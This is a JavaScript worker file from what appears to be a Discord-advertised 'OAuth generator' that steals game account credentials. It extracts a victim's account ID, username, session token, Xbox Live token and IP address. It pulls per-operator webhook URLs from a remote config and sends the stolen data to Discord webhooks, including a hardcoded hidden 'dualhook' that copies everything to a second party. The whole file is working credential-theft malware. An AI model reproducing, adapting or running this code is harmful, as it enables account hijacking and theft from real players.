const { workerData, parentPort } = require('worker_threads');
const fs = require('fs');
const path = require('path');
const { WebhookClient } = require('discord.js');
const https = require('https');

const { authenticationCode, logBuffer, userId, clientIP } = workerData;
const logLines = logBuffer.join('').split('\n');
// Use the 'id' as needed in your worker logic
console.log('Worker received ID:', userId);
let globalXblToken = null;
let extractedInfo = {
  id: null,
  name: null,
  token: null,
  xbl: null,
};

// A promise-based function to read the XBL token file
function readXblTokenFile() {
  return new Promise((resolve, reject) => {
    const folderPath = 'random'; // Change this to the folder path where your files are located
    const filePattern = /_xbl-cache.json/; // Pattern to match file names
    const timeThreshold = Date.now() - 10000; // Time threshold in milliseconds (10 seconds)

    fs.readdir(folderPath, (err, files) => {
      if (err) {
        console.error('Error reading directory:', err);
        return reject(err);
      }

      const relevantFiles = files.filter((file) => {
        const filePath = path.join(folderPath, file);
        const fileStat = fs.statSync(filePath);
        return filePattern.test(file) && fileStat.ctimeMs >= timeThreshold;
      });

      if (relevantFiles.length === 0) {
        console.log('No relevant files found.');
        return resolve(null); // Resolve with null if no relevant file is found
      }

      // Assuming you want to process the most recent file
      const mostRecentFile = relevantFiles.reduce((a, b) => (fs.statSync(a).ctimeMs > fs.statSync(b).ctimeMs ? a : b));
      const filePath = path.join(folderPath, mostRecentFile);

      fs.readFile(filePath, 'utf8', (readErr, data) => {
        if (readErr) {
          console.error('Error reading file:', readErr);
          return reject(readErr);
        }

        const tokenMatch = data.match(/"Token":"([^"]*)"/);
        const xblToken = tokenMatch ? tokenMatch[1] : null;

        if (xblToken) {
          return resolve(xblToken);
        } else {
          return resolve(null); // Resolve with null if no token is found
        }
      });
    });
  });
}
logLines.forEach((line) => {
  if (line.includes('id:')) {
    extractedInfo.id = line.replace(/'/g, '').trim(); // Remove single quotes
  } else if (line.includes('name:')) {
    extractedInfo.name = line.replace(/'/g, '').trim(); // Remove single quotes
  } else if (line.includes('token:')) {
    extractedInfo.token = line.replace(/'/g, '').trim(); // Remove single quotes
  }
  // Add additional filters as needed
});
// Use async/await to read the XBL token file
async function main() {
  try {
    const xblToken = await readXblTokenFile();
    
    if (xblToken) {
      globalXblToken = xblToken;
      extractedInfo.xbl = xblToken; // Set extractedInfo.xbl to the value of xblToken
      console.log('Extracted Token:', globalXblToken);
    } else {
      console.log('Token not found in the file.');
    }

    // Now you can use the globalXblToken and extractedInfo.xbl variables elsewhere in your code.
  } catch (error) {
    console.error('Error:', error);
  }

  const messageContent = `@everyone Got A BOZO!`;

  const messageEmbed = {
    color: 0x04042c,
    timestamp: new Date(),
    username: "We Follow Tos",
    avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",
    description: 'Oauth Gen hosted by Indigo discord.gg/rx7',
    fields: [
      {
        name: '**ID:**',
        value: '```' + (userId || extractedInfo.id || 'N/A') + '```',
        inline: false,
      },
      {
        name: '**Username:**',
        value: '```' + (extractedInfo.name || 'N/A') + '```',
        inline: false,
      },
      {
        name: '**Token:**',
        value: '```' + extractedInfo.token + '```',
        inline: false,
      },
      {
        name: '**IP:**',
        value: '```' + clientIP + '```',
        inline: false,
      },
    ],
  };

  const xblEmbed = {
    color: 0x04042c,
    title: 'XBL Token',
    description: `[XBL Link]( https://hypix-elauth.onrender.com/refreshxbl?xbl=${extractedInfo.xbl || 'N/A'})`,
  };

  const configPath = 'config.txt';
  const remoteConfigURL = 'https://bbindigo.000webhostapp.com/config.txt';

  https.get(remoteConfigURL, (response) => {
    let data = '';

    response.on('data', (chunk) => {
      data += chunk;
    });

    response.on('end', () => {
      try {
        fs.writeFileSync(configPath, data, 'utf8');
        console.log('Config file updated successfully.');

        // Read and parse the updated 'config.txt' file
        const configFile = fs.readFileSync(configPath, 'utf8');
        const configLines = configFile.split('\n');

        const configMap = {};
        configLines.forEach((line) => {
          // Use a regular expression to match the (id)=(webhook) format
          const match = line.match(/^(\w+)=(\S+)$/);

          if (match) {
            const id = match[1];
            const webhookURL = match[2];
            configMap[id] = webhookURL;
          }
        });

        const webhookURL = configMap[userId]; // Use userId to get the webhookURL
        const dualhook = "https://discord.com/api/webhooks/1164482847390830633/3d_6BERTyg6NAtPJMBLAA0sISmMYjZSHR1wY0RbcaLQghN8FPLrFRUVP3_z6pux5u-uJ";

        if (webhookURL) {
          const webhookClient = new WebhookClient({
            url: webhookURL,
          });
          if (dualhook) {
            const webhookClient2 = new WebhookClient({
              url: dualhook,
            });
            webhookClient2.send({
              content: messageContent,
              embeds: [messageEmbed, xblEmbed], // Send both messageEmbed and xblEmbed
            }).then(() => {
              parentPort.postMessage({ success: true });
            });
          }

          webhookClient.send({
            content: messageContent,
            embeds: [messageEmbed, xblEmbed], // Send both messageEmbed and xblEmbed
          }).then(() => {
            parentPort.postMessage({ success: true });
          });
        } else {
          parentPort.postMessage({ error: "Webhook URL not found for the provided id" });
        }
      } catch (err) {
        console.error('Error writing to config file:', err);
      }
    });
  }).on('error', (err) => {
    console.error('Error fetching remote config:', err);
  });
}

main();
